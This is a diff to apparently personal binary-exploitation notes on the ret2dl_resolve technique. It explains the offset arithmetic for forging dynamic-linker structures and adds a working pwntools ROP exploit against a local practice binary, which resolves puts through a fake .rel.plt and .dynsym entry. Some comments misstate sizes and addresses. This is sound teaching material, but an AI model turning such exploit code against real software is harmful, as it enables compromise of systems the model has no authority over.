@@ -1029,10 +1029,11 @@ with open('binary_dump', 'wb') as out:
 
 
 # ret2dl_resolve
-
+https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf
 <details>
     <summary>how _dl_runtime_resolve works </summary>
         <div>
+
 		
 # how _dl_runtime_resolve works
 
@@ -1173,79 +1174,193 @@ readelf -S resolve_partial_relro
 
 we can create a fake .rel.plt entry in the .bss and pass a huge index to _dl_runtime_resolve(elf_info,index)
 
-<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/relplt.png">
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_relplt.png">
 
 we set 0x277 as index.   \
-than runtime_resolve would than look for the .rel.plt entry @ 404078 which is in .bss we have controll over and can place a fake .rel.plt struct here that contains the fake r_info.   
-		
-each .rel.plt entry is 24 bytes in size.    	
-		
+than runtime_resolve would look for the .rel.plt entry @ 404078 which is in .bss we have controll over and can place a fake .rel.plt struct here that contains the fake r_info.   
+
 ```
-addr_fake_frame - addr_of_.rel.plt = byte_offset / 24 = index_offset 
+addr_fake_frame - addr_of_.rel.plt = byte_offset / 0x18 = index_offset 
 0x404078 - 00400550 = 0x3B28/24 = 0x277   
 ```
 
-<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynsym.png">
-we set our fake r_info to 0x360 and place our fake .dynsym struct that contains the fake st_name entry directly under our fake .rel.plt struct   /
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/_dynsym.png">
+we set our fake r_info to 0x288 and place our fake .dynsym struct that contains the fake st_name entry directly under our fake .rel.plt struct   /
 
-each .dynsym entry is 18 bytes in size 
+each .dynsym entry is 0x18 bytes in size 
 		
 ```
-(addr_fake_struct + offset_fake_dynsym) - addr_of_.dynsym = byte_offset / 18 = r_info_offset 
-(0x404078+24) - 004003c8     				#+24 cause our fake_.rel.plt is 24 bytes
-0x404090 - 004003c8 = 0x3cc8/18 = 0x360   
+(addr_fake_struct + len(fake_dynsym)) - addr_of_.dynsym = byte_offset / 0x18 = fake_r_info 
+(0x404078+0x10) - 004003c8     				#+0x10 cause our fake_.rel.plt is 18 bytes
+0x404088 - 004003c8 = 0x3cc0/0x18 = 0x288   
 ```	
 
-here we set the st_name offset to 0x3c2a.    \
-starting @ 0x400471 to our fake string @ 0x404078    
+here we set the st_name offset to 0x3c30.    \
+starting @ 0x400470 to our fake string @ 0x4040a0    
 ```
-(addr_fake_struct + offset_fake_dynsym + offset_fake_dynstr) - addr_of_.dynstr = st_name 
-(0x404078+24+18) - 0x400471    
-0x4040a2 - 0x400471 = 0x3c31    
+(addr_fake_struct + len(fake_dynsym) + len(fake_dynstr)) - addr_of_.dynstr = st_name 
+(0x404078+0x10+0x18) - 0x400470    			#+0x10 cause our fake_.rel.plt is 18 bytes +0x18 cause fake_dynsym is 24 bytes
+0x4040a0 - 0x400470 = 0x3c30    
 ```
-and as last step we set what libc function we want to resolve into our fake .dynstr entry @ 0x404062
+and as last step we set what libc function we want to resolve into our fake .dynstr entry @ 0x4040a0
 
 
 
-```
-_dl_runtime_resolve(elf_info , index)
-				|  
-                       _________|                   
- ___________________  |           
-| Relocation table  | |        
-|______.rel.plt_____| |               
-|        ...        | |               
-|___________________| |               
-|       r_offset    | |               
-|___________________| |               
-|       r_info      |<|               
-|___________________| .     
-                      .
-                      ..........
-	 ___________________   .
-	|    Writable area  |  .
-	|________.bss_______|  .
-	|      r_offset     |  .
-	|___________________|  .
- .......|      r_info       |<..
- .	|___________________|
- .      |        ...        |
- .      |___________________|
- .	|      st_name      |
- .	|___________________|
- .....>>|      st_info      |...   
-	|___________________|  . 
-	|        ...        |  . 
-	|___________________|  . 
-	|      execve\0     |<<. 
-	|___________________|
 
-
-```
 This aproach will not work allways:
 If the Dynamic loader checks the boundaries.
 If symbol versioning and huge pages are enabled. 
+		
 
+<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Method2.png">
+		
+```
+#!/usr/bin/env python3
+from pwn import *
+import ctypes
+
+fname = f'resolve_partial_relro'
+ip = '0.0.0.0'
+port = 1337
+
+#set target binary and context
+elf = context.binary = ELF(f'./{fname}')
+
+#set libc for Pwntools
+#libc = ELF('libc.so.6')
+
+
+
+gdbscript="""
+b *main
+b *0x00000000004011c8
+b *0x7ffff7fe7bb0
+b *0x7ffff7fe00b0
+b *0x7ffff7fe010b
+b *0x7ffff7fe017f
+"""
+
+mode = 'attach'
+
+if mode == 'attach':
+    r = process(f'{fname}',aslr=False)
+
+    #attach(f'{fname}',gdbscript=gdbscript)
+    #set follow-fork-mode child
+elif mode == 'debug':
+    r = gdb.debug(f'./{fname}',aslr=False,gdbscript=gdbscript)
+elif mode == 'remote':
+    r = remote(ip,port)
+
+rb = lambda x :r.recvb(x)
+rl = lambda : r.recvline()
+ru = lambda x :r.recvuntil(x)
+s = lambda x :r.send(x)
+sl = lambda x : r.sendline(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+# this will import the libc rand() function that we can use it in ur python script
+
+#libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+
+
+def pwn():
+
+
+    pop_rdi     = 0x401263
+    pop_rsi_r15 = 0x401261
+    pop_rdx     = 0x4011d1
+    read = elf.plt['read']
+    dl_resolve = 0x401020
+
+    dynsym = 0x4003c8
+    dynstr = 0x400470
+    rel_plt = 0x400550
+
+
+
+    fake_frame_addr = 0x404078
+    print(f'fake frame addr = {hex(fake_frame_addr)}')
+    print(f'fake r_info @ {hex(fake_frame_addr + 0xc)}')
+
+
+    fake_r_info = int(((fake_frame_addr + 0x18) - dynsym) / 0x18)
+    print(f'fake r_info = {hex(fake_r_info)}')
+    print(f'fake st_name @ {hex(fake_r_info*0x18 + dynsym)}') #addr of fake_st_name
+
+    #r_info is the offset from .dynsym to our fake .dynsym entry in steps of 0x18
+    #0x288*0x18 = 0x3cc0    0x4003c8 + 0x3xcc0 = 0x404088
+
+
+    fake_st_name = int((fake_frame_addr + 0x10 + 0x18) - dynstr)
+    print(f'fake st_name = {hex(fake_st_name)}')
+    print(f'fake string entry @ {hex(fake_st_name + dynstr)}')   #addr of fake_string_puts
+
+    #st_name is the offset form .dynstr to our fake string puts
+    #0x3c30 + 0x400470 = 0x4040a0
+
+
+
+
+    #fake .rel.plt 0x10
+    fake_frame = b''                                                                        
+    fake_frame += p64(0x404018)        #0x404078 - 0x404080               #GOT addr where to resolve to                       
+    fake_frame += p32(0x7)             #0x404080 - 0x404084               #needet to pass a internal check                    
+    fake_frame += p32(fake_r_info)     #0x404084 - 0x404088               #fake_r_info                                             
+                                                                          #r_addet we dont need these and it would destory the offsets when we add 8 bytes here
+    #fake .dynsym 0x18
+    fake_frame += p32(fake_st_name)    #0x404088 - 0x40408c               #st_name                                            
+    fake_frame += b'\x00'              #0x40408c - 0x40408d               #st_info                           
+    fake_frame += b'\x00'              #0x40408d - 0x40408e               #st_other                                           
+    fake_frame += b'\x00\x00'          #0x40408e - 0x404090               #st_shndx                                           
+    fake_frame += p64(0x00)            #0x404090 - 0x404098               #st_value                                           
+    fake_frame += p64(0x00)            #0x404098 - 0x4040a0               #st_size
+
+    #fake .dynstr entry
+    fake_frame += b'puts\x00'          #0x4040a8 -                        #fake dynstr entry 
+
+
+
+
+    len_fake_frame = len(fake_frame)
+
+    dl_resolve_index = int((fake_frame_addr - rel_plt) / 24)
+    print(f'fake Index = {hex(dl_resolve_index)}')
+
+    payload = b''
+    payload += b'A'*24              #pad
+		
+    #setup the read() to write our fake_frame
+    payload += p64(pop_rdi)
+    payload += p64(0x00)            #read from stdin
+    payload += p64(pop_rsi_r15)
+    payload += p64(fake_frame_addr)     #.bss addr
+    payload += p64(0x00)            #junk r15
+    payload += p64(pop_rdx)
+    payload += p64(len_fake_frame)
+    payload += p64(read)
+    
+    #setup registers for the resolved function in this case puts		
+    payload += p64(pop_rdi)
+    payload += p64(0x400000)            #argument for the function we resolve
+	
+    #setup arguments for the __dl_runtime_resolve() and call it.
+    payload += p64(dl_resolve)
+    payload += p64(dl_resolve_index)
+    #for debugging
+    payload += p64(0x1111111111111111)  #we hang here but we executed puts and '\x7fELF' sould be printed
+
+    s(payload)
+    pause(5)
+    s(fake_frame)
+    
+    inter()
+
+
+if __name__ == '__main__':
+    pwn()		
+```
 
 </div>
 </details>
